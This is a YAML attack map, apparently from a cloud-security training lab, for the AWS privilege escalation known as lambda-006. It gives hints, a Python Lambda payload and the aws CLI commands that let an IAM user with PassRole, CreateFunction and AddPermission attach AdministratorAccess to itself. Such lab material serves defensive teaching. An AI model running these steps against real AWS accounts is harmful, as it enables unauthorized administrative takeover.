attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-006-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the admin target role, lambda:CreateFunction,
        lambda:AddPermission, and lambda:InvokeFunction permissions. Unlike simpler
        Lambda escalation paths, this user must explicitly grant themselves invocation
        rights via a resource-based policy before they can execute the function.

    - id: malicious-lambda
      label: "Malicious Lambda"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-006-escalation"
      description: >
        A Lambda function created by the attacker with the admin target role as its
        execution role. The function code uses the admin role's credentials to attach
        AdministratorAccess to the starting user. Before it can be invoked, the attacker
        must add a resource-based policy statement granting themselves invocation rights.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-006-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess. It is used as the Lambda execution role,
        allowing the malicious function to call iam:AttachUserPolicy and attach
        AdministratorAccess to the starting user, completing the privilege escalation.

  edges:
    - from: starting-user
      to: malicious-lambda
      label: "iam:PassRole + lambda:CreateFunction"
      description: >
        The starting user creates a Lambda function, passing the admin target role as
        its execution role. The function payload contains code to attach AdministratorAccess
        to the starting user.
      hints:
        - "Use iam:ListRoles to enumerate the roles in this account and find any with elevated permissions."
        - "You can pass an IAM role to a Lambda function as its execution role -- look for roles you are explicitly permitted to pass."
        - "Write a Lambda function payload that performs an IAM action using the role's permissions. What action would be most useful if run as an admin role?"
        - "Lambda accepts a zip file containing your function code. The handler is the entry point -- name it carefully."
        - "Browse to https://pathfinding.cloud/paths/lambda-006 for technique details."
      commands:
        - description: "Create the malicious Lambda function payload"
          command: |
            cat > /tmp/lambda_payload.py << 'EOF'
            import boto3
            import os
            def handler(event, context):
                iam = boto3.client('iam')
                user_name = event.get('user_name')
                iam.attach_user_policy(
                    UserName=user_name,
                    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                )
                return {'status': 'success'}
            EOF
            zip /tmp/lambda_payload.zip /tmp/lambda_payload.py
        - description: "Create the Lambda function with the admin execution role"
          command: "aws lambda create-function --function-name pl-lambda-006-escalation --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-006-to-admin-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip"
    - from: starting-user
      to: malicious-lambda
      label: "lambda:AddPermission"
      description: >
        The starting user adds a resource-based policy statement to the Lambda function,
        granting themselves permission to invoke it. This step is required because IAM
        permissions alone do not automatically grant invocation rights to the function creator.
      hints:
        - "Creating a Lambda function doesn't automatically give you the right to invoke it. You need a separate step."
        - "Lambda uses both identity-based policies and resource-based policies to control invocation. Look at which permission in your starting set lets you modify the resource-based policy."
        - "Use lambda:GetPolicy to inspect the current resource-based policy on your function before and after adding permissions."
        - "When adding the permission, you're granting a specific AWS principal the right to call lambda:InvokeFunction on this function. Think about which principal should be the beneficiary."
      commands:
        - description: "Grant the starting user permission to invoke the Lambda function"
          command: "aws lambda add-permission --function-name pl-lambda-006-escalation --statement-id AllowSelfInvoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-006-to-admin-starting-user"
    - from: malicious-lambda
      to: target-role
      label: "lambda:InvokeFunction → iam:AttachUserPolicy"
      description: >
        The starting user invokes the Lambda function. The function executes under the
        admin target role's credentials and calls iam:AttachUserPolicy to attach
        AdministratorAccess to the starting user, completing the privilege escalation.
      hints:
        - "Wait for the Lambda function to reach Active state before attempting to invoke it."
        - "Invoke the function and check the response payload -- the function will return a status message indicating success or failure."
        - "After invoking, wait for IAM policy propagation before verifying. Use lambda:GetFunction to confirm the function ran successfully."
      commands:
        - description: "Invoke the Lambda function to escalate privileges"
          command: "aws lambda invoke --function-name pl-lambda-006-escalation --payload '{\"user_name\": \"pl-prod-lambda-006-to-admin-starting-user\"}' /tmp/lambda_output.json"
        - description: "Verify administrator access"
          command: "aws iam list-users --max-items 1"
